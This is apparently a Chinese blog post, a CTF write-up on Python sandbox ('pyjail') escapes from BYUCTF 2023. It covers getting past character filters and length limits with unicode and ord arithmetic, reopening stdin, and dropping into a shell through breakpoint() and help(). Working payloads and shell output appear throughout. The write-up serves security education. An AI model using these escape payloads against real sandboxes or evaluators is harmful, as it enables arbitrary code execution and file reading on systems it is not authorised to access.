> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [dummykitty.github.io](https://dummykitty.github.io/posts/pyjail-bypass-05-%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/)

> 绕过长度限制 BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制 1 eval((__import__("re").sub(r'[a-z0-9]','',input("co......

绕过长度限制[](#绕过长度限制)
-----------------

BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制

```
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```

题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取

```
print(open(bytes([102,108,97,103,46,116,120,116])).read())
```

函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).

```
# f = 102 = 333-231 = ord('ō')-ord('ç')
# a = 108 = 333-225 = ord('ō')-ord('á')
# l = 97 = 333-236 = ord('ō')-ord('ì')
# g = 103 = 333-230 = ord('ō')-ord('æ')
# . = 46 = 333-287 = ord('ō')-ord('ğ')
# t = 116 = 333-217 = ord('ō')-ord('Ù')
# x = 120 = = 333-213 = ord('ō')-ord('Õ')

print(open(bytes([ord('ō')-ord('ç'),ord('ō')-ord('á'),ord('ō')-ord('ì'),ord('ō')-ord('æ'),ord('ō')-ord('ğ'),ord('ō')-ord('Ù'),ord('ō')-ord('Õ'),ord('ō')-ord('Ù')])).read())
```

但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 `a('ō')` 进行替换。这样就可以构造一个满足条件的 payload

```
exec("a=ord;b=a('ō');print(open(bytes([b-a('ç'),b-a('á'),b-a('ì'),b-a('æ'),b-a('ğ'),b-a('Ù'),b-a('Õ'),b-a('Ù')])).read())")
```

但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)

当然，可以直接使用 input 函数来绕过长度限制。

### 打开 input 输入[](#打开-input-输入)

如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。

以 BYUCTF2023 jail a-z0-9 为例：

```
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```

即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）

这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。

```
__import__('os').system('whoami')
```

打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。

下面是一些打开输入流的方式:

#### sys.stdin.read()[](#sysstdinread)

注意输入完毕之后按 ctrl+d 结束输入

```
>>> eval(sys.stdin.read())
__import__('os').system('whoami')
kali
>>>
```

#### sys.stdin.readline()[](#sysstdinreadline)

```
>>> eval(sys.stdin.readline())
__import__('os').system('whoami')
```

#### sys.stdin.readlines()[](#sysstdinreadlines)

```
>>> eval(sys.stdin.readlines()[0])
__import__('os').system('whoami')
```

在 python2 中，在 python 2 中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。

### breakpoint 函数[](#breakpoint-函数)

pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。

在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码

```
>>> 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
> <stdin>(1)<module>()->None
(Pdb) __import__('os').system('ls')
a-z0-9.py  exp2.py  exp.py  flag.txt
(Pdb) __import__('os').system('sh')
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
```

### help 函数[](#help-函数)

help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh

当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助

然后输入 os, 此时会进入 os 的帮助文档。

然后在输入 `!sh` 就可以拿到 /bin/sh, 输入 `!bash` 则可以拿到 /bin/bash

```
help> os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$
```

参考资料[](#参考资料)
-------------

*   [Python 沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
*   [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
*   [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
*   [python 沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
*   [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
*   [[PyJail] python 沙箱逃逸探究 · 上（HNCTF 题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
*   [[PyJail] python 沙箱逃逸探究 · 中（HNCTF 题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
*   [[PyJail] python 沙箱逃逸探究 · 下（HNCTF 题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
*   [audited2](https://ctftime.org/writeup/31883)
*   [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
*   [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
*   [Python 沙箱逃逸的 n 种姿势](https://ctftime.org/writeup/28286)
*   [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)

This post is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.